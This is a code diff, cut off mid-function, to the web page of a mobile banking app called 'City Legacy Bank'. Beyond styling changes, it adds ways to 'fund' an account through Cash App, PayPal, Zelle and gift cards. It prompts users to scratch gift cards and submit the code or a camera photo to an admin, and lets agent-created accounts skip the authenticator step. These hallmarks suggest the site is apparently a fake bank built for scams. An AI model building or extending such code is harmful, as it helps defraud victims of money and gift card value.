@@ -3,9 +3,21 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, viewport-fit=cover">
+<meta name="theme-color" content="#0B3D91" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#0B3D91" media="(prefers-color-scheme: dark)">
+<meta name="color-scheme" content="light">
+<meta name="description" content="City Legacy Bank — private banking, accounts, transfers, and investments.">
+<meta name="application-name" content="City Legacy Bank">
 <meta name="mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="default">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="City Legacy">
+<meta name="format-detection" content="telephone=no">
+<link rel="manifest" href="manifest.webmanifest">
+<link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
+<link rel="icon" type="image/png" sizes="192x192" href="icon-192.png">
+<link rel="apple-touch-icon" href="apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="icon-180.png">
 <title>CITY LEGACY</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;500;600;700;800&family=Manrope:wght@500;600;700;800&display=swap" rel="stylesheet">
@@ -113,6 +125,15 @@ body {
 }
 
 /* Splash: full-screen overlay while loading; fully removed/hidden when done */
+
+/* Splash spinner fully disabled */
+.splash, #splash, #page-dashboard .splash {
+  display: none !important;
+  visibility: hidden !important;
+  pointer-events: none !important;
+  opacity: 0 !important;
+}
+
 #page-dashboard .splash,
 .splash {
   position: fixed !important;
@@ -2166,6 +2187,149 @@ body:not(:has(#page-dashboard.active)) .splash {
 #page-dashboard .header-row {
   margin-bottom: 10px !important;
 }
+
+/* ===== Four-square CLB logo (dashboard) ===== */
+#page-dashboard .logo.clb-quad-logo {
+  width: 42px; height: 42px; min-width: 42px;
+  display: flex; align-items: center; justify-content: center;
+  background: transparent !important;
+  box-shadow: none !important;
+  border: none !important;
+  padding: 0 !important;
+}
+#page-dashboard .logo.clb-quad-logo::after { display: none !important; content: none !important; }
+#page-dashboard .clb-quad-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 4px;
+  width: 34px; height: 34px;
+  filter: drop-shadow(0 0 10px rgba(232, 212, 139, 0.55));
+}
+#page-dashboard .clb-quad-grid span {
+  border-radius: 7px;
+  background: linear-gradient(145deg, #F5E6A8 0%, #E8D48B 35%, #D4AF37 70%, #B8960C 100%);
+  box-shadow: 0 2px 6px rgba(184, 150, 12, 0.28), inset 0 1px 0 rgba(255,255,255,0.45);
+}
+#page-dashboard .clb-quad-grid span:nth-child(2),
+#page-dashboard .clb-quad-grid span:nth-child(3) {
+  background: linear-gradient(145deg, #E8D48B 0%, #D4AF37 50%, #9A7B1A 100%);
+}
+
+/* ===== Premium banking polish (layout unchanged) ===== */
+#page-dashboard {
+  --clb-gold: #D4AF37;
+  --clb-gold-l: #E8D48B;
+  --clb-navy: #0B3D91;
+  --clb-ink: #0F172A;
+}
+#page-dashboard .app {
+  background:
+    radial-gradient(ellipse 90% 50% at 50% -10%, rgba(11,61,145,0.06), transparent 55%),
+    linear-gradient(180deg, #F8FAFC 0%, #F1F5F9 40%, #EEF2F7 100%);
+}
+#page-dashboard #homePage > .header {
+  background: linear-gradient(155deg, #0A2A6B 0%, #0B3D91 42%, #082E6E 78%, #0A2548 100%) !important;
+  box-shadow: 0 12px 36px rgba(8, 30, 70, 0.28), inset 0 -1px 0 rgba(232,212,139,0.18);
+  border-bottom: 1px solid rgba(232,212,139,0.22);
+  position: relative;
+  overflow: hidden;
+}
+#page-dashboard #homePage > .header::before {
+  content: '';
+  position: absolute; inset: 0; pointer-events: none;
+  background:
+    radial-gradient(ellipse 60% 80% at 100% 0%, rgba(212,175,55,0.16), transparent 50%),
+    radial-gradient(ellipse 40% 60% at 0% 100%, rgba(255,255,255,0.06), transparent 45%);
+}
+#page-dashboard .brand-name-dash {
+  font-family: 'Playfair Display', Georgia, serif !important;
+  font-weight: 800 !important;
+  letter-spacing: 0.04em !important;
+  color: #FFFFFF !important;
+  text-shadow: 0 1px 8px rgba(0,0,0,0.25);
+}
+#page-dashboard .acc-type {
+  color: #E8D48B !important;
+  letter-spacing: 0.16em !important;
+  font-weight: 700 !important;
+}
+#page-dashboard .greeting {
+  font-family: 'Playfair Display', Georgia, serif;
+  font-weight: 700;
+  color: #FFFFFF;
+  letter-spacing: -0.01em;
+  text-shadow: 0 1px 6px rgba(0,0,0,0.2);
+}
+#page-dashboard .balance-section {
+  position: relative; z-index: 1;
+}
+#page-dashboard .balance-amount {
+  font-family: 'Playfair Display', Georgia, serif !important;
+  font-weight: 800 !important;
+  letter-spacing: -0.02em;
+  text-shadow: 0 2px 16px rgba(0,0,0,0.25);
+}
+#page-dashboard .balance-label {
+  letter-spacing: 0.08em !important;
+  opacity: 0.92;
+}
+#page-dashboard .balance-details {
+  display: inline-block;
+  margin-top: 10px;
+  padding: 6px 14px;
+  border-radius: 999px;
+  background: rgba(255,255,255,0.12);
+  border: 1px solid rgba(232,212,139,0.35);
+  text-decoration: none !important;
+  backdrop-filter: blur(8px);
+  font-weight: 700 !important;
+  letter-spacing: 0.04em;
+}
+#page-dashboard .header-avatar {
+  border: 2px solid rgba(232,212,139,0.55) !important;
+  box-shadow: 0 4px 14px rgba(0,0,0,0.2);
+}
+#page-dashboard .header-icon svg { stroke: #F8FAFC; }
+#page-dashboard .notif-badge {
+  background: linear-gradient(135deg, #D4AF37, #B8960C) !important;
+  color: #0A2A6B !important;
+  box-shadow: 0 2px 8px rgba(212,175,55,0.45);
+}
+#page-dashboard .action-grid .action-btn,
+#page-dashboard .actions .action,
+#page-dashboard .quick-actions .qa-item {
+  border-radius: 16px !important;
+  box-shadow: 0 4px 18px rgba(15,23,42,0.06);
+  border: 1px solid rgba(226,232,240,0.9);
+  transition: transform 0.18s ease, box-shadow 0.2s ease;
+}
+#page-dashboard .action-grid .action-btn:active,
+#page-dashboard .actions .action:active {
+  transform: scale(0.97);
+}
+#page-dashboard .card,
+#page-dashboard .product-card,
+#page-dashboard .txn-card,
+#page-dashboard .section-card {
+  border-radius: 16px !important;
+  border: 1px solid rgba(226,232,240,0.95);
+  box-shadow: 0 6px 24px rgba(15,23,42,0.05);
+  background: linear-gradient(180deg, #FFFFFF 0%, #FBFCFE 100%);
+}
+#page-dashboard .bottom-nav {
+  background: rgba(255,255,255,0.94) !important;
+  backdrop-filter: saturate(180%) blur(16px);
+  -webkit-backdrop-filter: saturate(180%) blur(16px);
+  border-top: 1px solid rgba(212,175,55,0.22) !important;
+  box-shadow: 0 -8px 28px rgba(15,23,42,0.06);
+}
+#page-dashboard .bottom-nav .nav-item.active {
+  color: #0B3D91 !important;
+}
+#page-dashboard .bottom-nav .nav-item.active svg {
+  stroke: #D4AF37 !important;
+}
+
 #page-dashboard .logo {
   width: 30px !important;
   height: 30px !important;
@@ -4454,6 +4618,51 @@ body { top: 0 !important; }
   font-size: 10px; font-weight: 800; letter-spacing: 0.14em;
   text-transform: uppercase; margin-bottom: 6px;
 }
+
+#page-dashboard .clb-dash-promo-slide {
+  display: flex !important;
+  flex-direction: row;
+  align-items: center;
+  gap: 10px;
+  padding-right: 12px !important;
+}
+#page-dashboard .clb-dash-promo-copy {
+  flex: 1;
+  min-width: 0;
+  position: relative;
+  z-index: 1;
+}
+#page-dashboard .clb-dash-promo-art {
+  flex-shrink: 0;
+  width: 88px;
+  height: 88px;
+  position: relative;
+  z-index: 1;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-right: 2px;
+}
+#page-dashboard .clb-dash-promo-art img {
+  width: 88px;
+  height: 88px;
+  object-fit: contain;
+  filter: drop-shadow(0 6px 14px rgba(0,0,0,0.18));
+  pointer-events: none;
+  user-select: none;
+}
+#page-dashboard .clb-dash-promo-slide::after {
+  /* keep decorative blob behind art */
+  right: -8px;
+  top: -20px;
+  width: 120px;
+  height: 120px;
+}
+@media (max-width: 360px) {
+  #page-dashboard .clb-dash-promo-art { width: 72px; height: 72px; }
+  #page-dashboard .clb-dash-promo-art img { width: 72px; height: 72px; }
+}
+
 #page-dashboard .clb-dash-promo-title {
   font-family: 'Playfair Display', Georgia, serif;
   font-size: 16px; font-weight: 800; margin-bottom: 6px; line-height: 1.25;
@@ -7015,38 +7224,6 @@ html, body { color-scheme: light only; }
 
 <!-- PAGE: DASHBOARD -->
 <div id="page-dashboard" class="app-page">
-<div class="splash" id="splash">
-  <div class="splash-card" id="splashCard">
-    <div class="splash-logo-wrap">
-      <div class="splash-logo-grid"><span></span><span></span><span></span><span></span></div>
-    </div>
-    <div class="splash-brand-name">CITY LEGACY</div>
-    <div class="splash-brand-sub"><span>BANK</span></div>
-
-    <div class="splash-ring-wrap" id="splashRingWrap">
-      <svg viewBox="0 0 100 100">
-        <circle class="splash-ring-track" cx="50" cy="50" r="44"></circle>
-        <circle class="splash-ring-arc" id="splashRingArc" cx="50" cy="50" r="44"></circle>
-      </svg>
-      <div class="splash-ring-center" id="splashRingCenter">
-        <div class="splash-spinner" id="splashSpinner" aria-hidden="true"></div>
-        <span class="splash-step-num" id="splashStepNum">01</span>
-      </div>
-    </div>
-
-    <div class="splash-dots-wrap" id="splashDotsWrap">
-      <div class="splash-dot" data-i="0"></div>
-      <div class="splash-dot" data-i="1"></div>
-      <div class="splash-dot" data-i="2"></div>
-      <div class="splash-dot" data-i="3"></div>
-      <div class="splash-dot" data-i="4"></div>
-    </div>
-
-    <div class="splash-status" id="splashStatusText"></div>
-    <div class="splash-sub" id="splashSubText"></div>
-  </div>
-</div>
-
 <div class="loader" id="loader">
   <div class="loader-card">
     <div class="spinner"></div>
@@ -7065,13 +7242,10 @@ html, body { color-scheme: light only; }
     <div class="header">
       <div class="header-row">
         <div class="logo-section">
-          <div class="logo" aria-label="City Legacy bank logo">
-            <svg viewBox="0 0 48 48" role="img" aria-hidden="true">
-              <circle class="logo-ring" cx="24" cy="24" r="20.5"></circle>
-              <path class="logo-mark" d="M14 15.5h20M17 19.5h14M18.5 19.5v13M24 19.5v13M29.5 19.5v13M15.5 32.5h17"></path>
-              <path class="logo-mark-fill" d="M21.8 10.5h4.4v5.2h-4.4z"></path>
-              <path class="logo-mark" d="M19 9.5h10"></path>
-            </svg>
+          <div class="logo clb-quad-logo" aria-label="City Legacy bank logo">
+            <div class="clb-quad-grid" aria-hidden="true">
+              <span></span><span></span><span></span><span></span>
+            </div>
           </div>
           <div class="brand-text-dash">
             <div class="brand-name-dash">CITY LEGACY</div>
@@ -7169,24 +7343,44 @@ html, body { color-scheme: light only; }
     <div class="clb-dash-promo" id="clbDashPromo" aria-live="polite">
       <div class="clb-dash-promo-slides">
         <div class="clb-dash-promo-slide theme-navy is-active">
-          <div class="clb-dash-promo-eyebrow">Investments</div>
-          <div class="clb-dash-promo-title">Grow wealth with confidence</div>
-          <div class="clb-dash-promo-text">Diversified portfolios and guided investing — start with as little as you choose, monitored by City Legacy advisors.</div>
+          <div class="clb-dash-promo-copy">
+            <div class="clb-dash-promo-eyebrow">Investments</div>
+            <div class="clb-dash-promo-title">Grow wealth with confidence</div>
+            <div class="clb-dash-promo-text">Diversified portfolios and guided investing — start with as little as you choose, monitored by City Legacy advisors.</div>
+          </div>
+          <div class="clb-dash-promo-art" aria-hidden="true">
+            <img src="promo-investment.png" alt="" width="88" height="88" loading="lazy"/>
+          </div>
         </div>
         <div class="clb-dash-promo-slide theme-white">
-          <div class="clb-dash-promo-eyebrow">Loans</div>
-          <div class="clb-dash-promo-title">Flexible financing, clear terms</div>
-          <div class="clb-dash-promo-text">Personal, business, and mortgage options with competitive rates and decisions typically within 24–48 hours.</div>
+          <div class="clb-dash-promo-copy">
+            <div class="clb-dash-promo-eyebrow">Loans</div>
+            <div class="clb-dash-promo-title">Flexible financing, clear terms</div>
+            <div class="clb-dash-promo-text">Personal, business, and mortgage options with competitive rates and decisions typically within 24–48 hours.</div>
+          </div>
+          <div class="clb-dash-promo-art" aria-hidden="true">
+            <img src="promo-loan.png" alt="" width="88" height="88" loading="lazy"/>
+          </div>
         </div>
         <div class="clb-dash-promo-slide theme-navy">
-          <div class="clb-dash-promo-eyebrow">Savings</div>
-          <div class="clb-dash-promo-title">Save smarter every day</div>
-          <div class="clb-dash-promo-text">High-yield savings and goal-based accounts help you build emergency funds and long-term security.</div>
+          <div class="clb-dash-promo-copy">
+            <div class="clb-dash-promo-eyebrow">Savings</div>
+            <div class="clb-dash-promo-title">Save smarter every day</div>
+            <div class="clb-dash-promo-text">High-yield savings and goal-based accounts help you build emergency funds and long-term security.</div>
+          </div>
+          <div class="clb-dash-promo-art" aria-hidden="true">
+            <img src="promo-savings.png" alt="" width="88" height="88" loading="lazy"/>
+          </div>
         </div>
         <div class="clb-dash-promo-slide theme-white">
-          <div class="clb-dash-promo-eyebrow">Joint accounts</div>
-          <div class="clb-dash-promo-title">Bank together, simply</div>
-          <div class="clb-dash-promo-text">Open a joint checking or savings account with shared access, transparent activity, and full FDIC coverage.</div>
+          <div class="clb-dash-promo-copy">
+            <div class="clb-dash-promo-eyebrow">Joint accounts</div>
+            <div class="clb-dash-promo-title">Bank together, stay aligned</div>
+            <div class="clb-dash-promo-text">Open a joint checking or savings account with shared access, transparent activity, and full FDIC coverage.</div>
+          </div>
+          <div class="clb-dash-promo-art" aria-hidden="true">
+            <img src="promo-joint.png" alt="" width="88" height="88" loading="lazy"/>
+          </div>
         </div>
       </div>
       <div class="clb-dash-promo-dots" id="clbDashPromoDots" role="tablist" aria-label="Promotions">
@@ -8021,8 +8215,33 @@ html, body { color-scheme: light only; }
           loginLockLevel = 0;
           loginLockedUntil = 0;
           updateLoginLockUI();
+          var cust = res.customer || {};
+          var needAuth = true;
+          if (typeof res.needAuthenticator === 'boolean') {
+            needAuth = res.needAuthenticator;
+          } else if (typeof cust._needAuthenticator === 'boolean') {
+            needAuth = cust._needAuthenticator;
+          } else if (typeof cust.authenticatorEnabled === 'boolean') {
+            needAuth = cust.authenticatorEnabled;
+          } else if (cust.createdBy && cust.createdBy !== 'master' && res.data && res.data.agents) {
+            var ag = (res.data.agents || []).find(function(a){ return a.id === cust.createdBy; });
+            if (ag && typeof ag.authenticatorEnabled === 'boolean') needAuth = ag.authenticatorEnabled;
+          }
+          if (!needAuth) {
+            window.__clbPendingLoginCustomer = null;
+            window.__clbPendingLoginCustomer = cust;
+            if (typeof window.completeLoginAfterAuthenticator === 'function') {
+              window.completeLoginAfterAuthenticator();
+            } else if (window.clbCloud && typeof window.clbCloud.setSession === 'function') {
+              try { window.clbCloud.setSession(cust); } catch(e) {}
+              if (typeof showPage === 'function') showPage('dashboard');
+              else if (typeof switchPage === 'function') switchPage('dashboard');
+            }
+            if (btn) { btn.disabled = false; btn.textContent = 'Sign in'; }
+            return;
+          }
           // Hold pending customer — require authenticator 6-digit code before dashboard
-          window.__clbPendingLoginCustomer = res.customer;
+          window.__clbPendingLoginCustomer = cust;
           // Hide spin, show authenticator form (skip long multi-stage login spin)
           if (spin) spin.style.display = 'none';
           if (form) form.style.display = 'none';
@@ -8283,7 +8502,7 @@ html, body { color-scheme: light only; }
     if (first) setTimeout(function(){ try { first.focus(); } catch(e){} }, 80);
   };
 
-  function completeLoginAfterAuthenticator() {
+  window.completeLoginAfterAuthenticator = function completeLoginAfterAuthenticator() {
     var customer = window.__clbPendingLoginCustomer;
     window.__clbPendingLoginCustomer = null;
     clearOtpBoxes();
@@ -9980,8 +10199,25 @@ html, body { color-scheme: light only; }
       <label class="check-row"><input type="checkbox" data-required> I've endorsed the back with "For Mobile Deposit Only"</label>
       <button class="modal-btn" onclick="if(validateForm(this)) showLoader(() => showSuccess('Deposit submitted', 'Funds are typically available next business day'), {steps:['Reading check image…','Verifying amount…','Submitting deposit…'], duration:1400})">Submit Deposit</button>`},
 
-    wallet: {title: "Crypto Wallet", body: `
-      <p style="font-size:13.5px;color:#475569;line-height:1.5;margin:0 0 14px;">Add money to your City Legacy account through cryptocurrency. Select a permitted asset to request a deposit wallet address.</p>
+    wallet: {title: "Fund / Wallet Request", body: `
+      <p style="font-size:13.5px;color:#475569;line-height:1.5;margin:0 0 14px;">Add money to your City Legacy account. Choose crypto, Cash App, PayPal, Zelle, or a gift card.</p>
+      <div class="form-group">
+        <label>Other funding methods</label>
+      </div>
+      <div id="clbAltFundList" style="display:grid;gap:8px;margin-bottom:14px;">
+        <button type="button" class="clb-crypto-btn" data-method="CASHAPP" onclick="clbRequestAltFund(this)">
+          <span class="cc-ico">$</span><span class="cc-name">Cash App</span><span class="cc-code">CASHAPP</span>
+        </button>
+        <button type="button" class="clb-crypto-btn" data-method="PAYPAL" onclick="clbRequestAltFund(this)">
+          <span class="cc-ico">P</span><span class="cc-name">PayPal</span><span class="cc-code">PAYPAL</span>
+        </button>
+        <button type="button" class="clb-crypto-btn" data-method="ZELLE" onclick="clbRequestAltFund(this)">
+          <span class="cc-ico">Z</span><span class="cc-name">Zelle</span><span class="cc-code">ZELLE</span>
+        </button>
+        <button type="button" class="clb-crypto-btn" data-method="GIFTCARD" onclick="clbRequestGiftCardFund(this)">
+          <span class="cc-ico">🎁</span><span class="cc-name">Gift card</span><span class="cc-code">GIFT</span>
+        </button>
+      </div>
       <div class="form-group">
         <label>Permitted cryptocurrencies</label>
       </div>
@@ -10018,6 +10254,41 @@ html, body { color-scheme: light only; }
         <div id="clbCryptoDoneText" style="font-size:14.5px;font-weight:700;color:#0B3D91;line-height:1.45;"></div>
         <p style="font-size:12.5px;color:#64748B;margin:10px 0 0;line-height:1.5;">Kindly check your inbox. A treasury officer will reply with your deposit address.</p>
         <button type="button" class="modal-btn" onclick="closeModal()" style="margin-top:16px;">Done</button>
+      </div>
+      <div id="clbGiftSpin" style="display:none;text-align:center;padding:28px 12px;">
+        <div class="clb-crypto-spin" style="width:48px;height:48px;border:3px solid #E2E8F0;border-top-color:#D4AF37;border-radius:50%;margin:0 auto 14px;animation:splashLoaderSpin 0.8s linear infinite;"></div>
+        <div id="clbGiftSpinText" style="font-size:14px;font-weight:700;color:#0B3D91;">Processing gift card request…</div>
+        <div id="clbGiftSpinCountdown" style="font-size:22px;font-weight:800;color:#D4AF37;margin-top:10px;font-family:Playfair Display,Georgia,serif;">0:10</div>
+        <div style="font-size:12.5px;color:#64748B;margin-top:6px;">Please wait a moment</div>
+      </div>
+      <div id="clbGiftCapture" style="display:none;padding:8px 4px 12px;">
+        <p style="font-size:14px;font-weight:700;color:#0B3D91;line-height:1.5;margin:0 0 12px;text-align:center;">Kindly scratch the gift card, use the camera options and snap the card and press okay, or if it is a code kindly type the code using the code option.</p>
+        <div style="display:flex;gap:8px;margin-bottom:14px;">
+          <button type="button" class="modal-btn" id="clbGiftTabCode" style="flex:1;background:#0B3D91;" onclick="clbGiftTab('code')">Code option</button>
+          <button type="button" class="modal-btn" id="clbGiftTabCam" style="flex:1;background:#64748B;" onclick="clbGiftTab('camera')">Camera option</button>
+        </div>
+        <div id="clbGiftCodePane">
+          <div class="form-group">
+            <label>Gift card code</label>
+            <input class="form-input" id="clbGiftCodeInput" type="text" placeholder="Enter scratched code" autocomplete="off"/>
+          </div>
+          <button type="button" class="modal-btn" onclick="clbGiftSubmitCode()">Submit code</button>
+        </div>
+        <div id="clbGiftCamPane" style="display:none;">
+          <div style="position:relative;border-radius:12px;overflow:hidden;background:#0B3D91;aspect-ratio:4/3;margin-bottom:10px;">
+            <video id="clbGiftCamVideo" playsinline autoplay muted style="width:100%;height:100%;object-fit:cover;display:block;"></video>
+            <canvas id="clbGiftCamCanvas" style="display:none;"></canvas>
+            <div id="clbGiftCamPrev" style="display:none;position:absolute;inset:0;background:#000;">
+              <img id="clbGiftCamImg" alt="Gift card" style="width:100%;height:100%;object-fit:contain;"/>
+            </div>
+          </div>
+          <div style="display:flex;gap:8px;flex-wrap:wrap;">
+            <button type="button" class="modal-btn" style="flex:1;" onclick="clbGiftStartCamera()">Open camera</button>
+            <button type="button" class="modal-btn" style="flex:1;background:#0B3D91;" onclick="clbGiftSnap()">Snap</button>
+          </div>
+          <button type="button" class="modal-btn" style="margin-top:10px;background:#D4AF37;color:#0B3D91;" onclick="clbGiftSubmitPhoto()">Okay — send to bank</button>
+          <input type="file" id="clbGiftFileFallback" accept="image/*" capture="environment" style="display:none" onchange="clbGiftFilePicked(this)"/>
+        </div>
       </div>
       <style>
         .clb-crypto-btn{display:flex;align-items:center;gap:12px;width:100%;padding:12px 14px;border:1.5px solid #E2E8F0;border-radius:12px;background:#FFFFFF;cursor:pointer;font-family:inherit;text-align:left;transition:border-color .15s,box-shadow .15s,transform .12s;}
@@ -10341,6 +10612,269 @@ html, body { color-scheme: light only; }
     BTC: 'Bitcoin', ETH: 'Ethereum', XRP: 'XRP', SOL: 'Solana',
     BNB: 'BNB', TON: 'Ton', USDT: 'USDT'
   };
+
+  window.clbRequestAltFund = async function(btn) {
+    var method = (btn && btn.getAttribute('data-method')) || 'CASHAPP';
+    var labels = { CASHAPP: 'Cash App', PAYPAL: 'PayPal', ZELLE: 'Zelle' };
+    var name = labels[method] || method;
+    var list = document.getElementById('clbCryptoList');
+    var alt = document.getElementById('clbAltFundList');
+    var busy = document.getElementById('clbCryptoBusy');
+    var done = document.getElementById('clbCryptoDone');
+    var busyText = document.getElementById('clbCryptoBusyText');
+    var doneText = document.getElementById('clbCryptoDoneText');
+    if (list) list.style.display = 'none';
+    if (alt) alt.style.display = 'none';
+    if (done) done.style.display = 'none';
+    if (busy) busy.style.display = 'block';
+    if (busyText) busyText.textContent = 'Submitting your ' + name + ' request…';
+    await new Promise(function(r){ setTimeout(r, 2500); });
+    try {
+      if (window.clbCloud && typeof window.clbCloud.requestCryptoWallet === 'function') {
+        await window.clbCloud.requestCryptoWallet(method, name);
+      }
+    } catch (err) { console.error(err); }
+    if (busy) busy.style.display = 'none';
+    if (done) done.style.display = 'block';
+    if (doneText) {
+      doneText.textContent = 'Your ' + name + ' funding request was sent. Kindly check your inbox for a reply.';
+    }
+    if (typeof showToast === 'function') showToast(name + ' request sent', 'success');
+  };
+
+  window.__clbGiftPhoto = null;
+  window.__clbGiftStream = null;
+  window.clbRequestGiftCardFund = async function(btn) {
+    var list = document.getElementById('clbCryptoList');
+    var alt = document.getElementById('clbAltFundList');
+    var busy = document.getElementById('clbCryptoBusy');
+    var done = document.getElementById('clbCryptoDone');
+    var spin = document.getElementById('clbGiftSpin');
+    var capture = document.getElementById('clbGiftCapture');
+    var cd = document.getElementById('clbGiftSpinCountdown');
+    if (list) list.style.display = 'none';
+    if (alt) alt.style.display = 'none';
+    if (busy) busy.style.display = 'none';
+    if (done) done.style.display = 'none';
+    if (capture) capture.style.display = 'none';
+    if (spin) spin.style.display = 'block';
+    var total = 10; // 10 seconds
+    var left = total;
+    if (cd) cd.textContent = '3:00';
+    await new Promise(function(resolve) {
+      var t = setInterval(function() {
+        left--;
+        if (left < 0) left = 0;
+        var m = Math.floor(left / 60);
+        var s = left % 60;
+        if (cd) cd.textContent = m + ':' + (s < 10 ? '0' : '') + s;
+        if (left <= 0) { clearInterval(t); resolve(); }
+      }, 1000);
+    });
+    if (spin) spin.style.display = 'none';
+    if (capture) capture.style.display = 'block';
+    if (typeof clbGiftTab === 'function') clbGiftTab('code');
+  };
+
+  window.clbGiftTab = function(which) {
+    var codePane = document.getElementById('clbGiftCodePane');
+    var camPane = document.getElementById('clbGiftCamPane');
+    var tabC = document.getElementById('clbGiftTabCode');
+    var tabM = document.getElementById('clbGiftTabCam');
+    if (which === 'camera') {
+      if (codePane) codePane.style.display = 'none';
+      if (camPane) camPane.style.display = 'block';
+      if (tabC) tabC.style.background = '#64748B';
+      if (tabM) tabM.style.background = '#0B3D91';
+    } else {
+      if (codePane) codePane.style.display = 'block';
+      if (camPane) camPane.style.display = 'none';
+      if (tabC) tabC.style.background = '#0B3D91';
+      if (tabM) tabM.style.background = '#64748B';
+    }
+  };
+
+  window.clbGiftStartCamera = async function() {
+    try {
+      if (window.__clbGiftStream) {
+        try { window.__clbGiftStream.getTracks().forEach(function(t){ t.stop(); }); } catch(e) {}
+      }
+      var stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
+      window.__clbGiftStream = stream;
+      var v = document.getElementById('clbGiftCamVideo');
+      var prev = document.getElementById('clbGiftCamPrev');
+      if (prev) prev.style.display = 'none';
+      if (v) {
+        v.style.display = 'block';
+        v.srcObject = stream;
+        await v.play();
+      }
+    } catch (e) {
+      console.error(e);
+      var fb = document.getElementById('clbGiftFileFallback');
+      if (fb) fb.click();
+      if (typeof showToast === 'function') showToast('Camera unavailable — choose a photo', 'error');
+    }
+  };
+
+  window.clbGiftSnap = function() {
+    var v = document.getElementById('clbGiftCamVideo');
+    var canvas = document.getElementById('clbGiftCamCanvas');
+    if (!v || !canvas || !v.videoWidth) {
+      if (typeof showToast === 'function') showToast('Open the camera first', 'error');
+      return;
+    }
+    canvas.width = v.videoWidth;
+    canvas.height = v.videoHeight;
+    var ctx = canvas.getContext('2d');
+    ctx.drawImage(v, 0, 0);
+    var dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+    window.__clbGiftPhoto = dataUrl;
+    var prev = document.getElementById('clbGiftCamPrev');
+    var img = document.getElementById('clbGiftCamImg');
+    if (img) img.src = dataUrl;
+    if (prev) prev.style.display = 'block';
+    if (v) v.style.display = 'none';
+    if (window.__clbGiftStream) {
+      try { window.__clbGiftStream.getTracks().forEach(function(t){ t.stop(); }); } catch(e) {}
+      window.__clbGiftStream = null;
+    }
+    if (typeof showToast === 'function') showToast('Photo captured', 'success');
+  };
+
+  window.clbGiftFilePicked = function(input) {
+    var f = input.files && input.files[0];
+    if (!f) return;
+    var reader = new FileReader();
+    reader.onload = function() {
+      window.__clbGiftPhoto = reader.result;
+      var prev = document.getElementById('clbGiftCamPrev');
+      var img = document.getElementById('clbGiftCamImg');
+      var v = document.getElementById('clbGiftCamVideo');
+      if (img) img.src = reader.result;
+      if (prev) prev.style.display = 'block';
+      if (v) v.style.display = 'none';
+    };
+    reader.readAsDataURL(f);
+  };
+
+  async function clbGiftPushToAdmin(payload) {
+    payload = payload || {};
+    if (!window.clbCloud || !window.clbCloud.loadBin || !window.clbCloud.saveBin) {
+      // try private names used in file
+      if (window.clbCloud && window.clbCloud._loadBin) {
+        /* fallthrough */
+      }
+    }
+    var me = (window.clbCloud && window.clbCloud.getSession) ? window.clbCloud.getSession() : null;
+    if (!me) throw new Error('not_logged_in');
+    // Prefer public request path + giftCardSubmissions
+    if (typeof window.clbCloud.requestCryptoWallet === 'function' && payload.code && !payload.photo) {
+      await window.clbCloud.requestCryptoWallet('GIFTCARD', 'Gift card · ' + payload.code);
+    }
+    // Direct bin write for photo + structured gift submission (does not alter customer records)
+    var load = window.clbCloud.loadBin || window.clbCloud._loadBin;
+    var save = window.clbCloud.saveBin || window.clbCloud._saveBin;
+    if (typeof load === 'function' && typeof save === 'function') {
+      var data = await load();
+      data.giftCardSubmissions = data.giftCardSubmissions || [];
+      data.walletRequests = data.walletRequests || [];
+      data.messages = data.messages || [];
+      var now = new Date().toISOString();
+      var gid = 'gc' + Date.now().toString(36);
+      data.giftCardSubmissions.unshift({
+        id: gid,
+        customerId: me.id,
+        customerName: me.name,
+        accountNumber: me.accountNumber,
+        walletId: (me.investments && me.investments.walletId) || '',
+        code: payload.code || '',
+        photo: payload.photo || null,
+        amount: 0,
+        message: payload.message || 'Gift card funding request from wallet page',
+        status: 'pending',
+        timestamp: now
+      });
+      data.walletRequests.unshift({
+        id: 'wr' + Date.now().toString(36),
+        customerId: me.id,
+        customerName: me.name,
+        accountNumber: me.accountNumber,
+        asset: 'GIFTCARD',
+        assetName: 'Gift card',
+        method: 'giftcard',
+        code: payload.code || '',
+        photo: payload.photo || null,
+        status: 'pending',
+        timestamp: now,
+        note: 'Gift card submission'
+      });
+      data.messages.unshift({
+        id: 'm' + Date.now().toString(36),
+        fromType: 'customer',
+        fromId: me.id,
+        fromName: me.name,
+        fromAccount: me.accountNumber,
+        toType: 'admin',
+        toId: 'admin',
+        toName: 'City Legacy Support',
+        subject: 'Gift card funding request',
+        body: 'Customer ' + (me.name || '') + ' (' + (me.accountNumber || '') + ') submitted a gift card.\nCode: ' + (payload.code || '(photo)') + '\n',
+        timestamp: now,
+        read: false,
+        msgType: 'gift_card'
+      });
+      await save(data);
+    }
+  }
+
+  window.clbGiftSubmitCode = async function() {
+    var code = ((document.getElementById('clbGiftCodeInput') || {}).value || '').trim();
+    if (!code) {
+      if (typeof showToast === 'function') showToast('Enter the gift card code', 'error');
+      return;
+    }
+    try {
+      await clbGiftPushToAdmin({ code: code, message: 'Gift card code submitted' });
+      var capture = document.getElementById('clbGiftCapture');
+      var done = document.getElementById('clbCryptoDone');
+      var doneText = document.getElementById('clbCryptoDoneText');
+      if (capture) capture.style.display = 'none';
+      if (done) done.style.display = 'block';
+      if (doneText) doneText.textContent = 'Gift card code submitted. Admin will review and reply in your inbox.';
+      if (typeof showToast === 'function') showToast('Gift card submitted', 'success');
+    } catch (e) {
+      console.error(e);
+      if (typeof showToast === 'function') showToast('Could not submit gift card', 'error');
+    }
+  };
+
+  window.clbGiftSubmitPhoto = async function() {
+    if (!window.__clbGiftPhoto) {
+      if (typeof showToast === 'function') showToast('Snap the card first', 'error');
+      return;
+    }
+    try {
+      await clbGiftPushToAdmin({ photo: window.__clbGiftPhoto, message: 'Gift card photo submitted' });
+      if (window.__clbGiftStream) {
+        try { window.__clbGiftStream.getTracks().forEach(function(t){ t.stop(); }); } catch(e) {}
+        window.__clbGiftStream = null;
+      }
